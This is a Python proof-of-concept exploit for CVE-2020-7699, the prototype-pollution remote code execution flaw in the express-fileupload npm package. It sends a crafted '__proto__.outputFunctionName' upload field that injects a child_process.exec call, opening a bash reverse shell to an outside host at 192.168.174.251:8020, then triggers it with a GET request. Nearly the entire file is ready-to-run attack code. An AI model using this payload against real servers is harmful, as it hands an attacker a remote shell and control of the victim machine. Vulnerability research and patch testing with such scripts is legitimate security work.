#!/usr/bin/env python3

# CVE-2020-7699 is a Remote Code Execution (RCE) vulnerability in the express-fileupload npm package. 
# It allows an attacker to execute arbitrary commands on the server by uploading files with specially crafted names or payloads,
# affecting versions <=1.1.6-alpha.6. The issue is fixed in version >=1.1.9

import requests

### commands to run on victim machine
cmd = 'bash -c "bash -i &> /dev/tcp/192.168.174.251/8020 0>&1"'

print("Starting Attack...")
### pollute
requests.post('http://127.0.0.1:8080', files = {'__proto__.outputFunctionName': (
    None, f"x;console.log(1);process.mainModule.require('child_process').exec('{cmd}');x")})

### execute command
requests.get('http://127.0.0.1:8080')
print("Finished!")
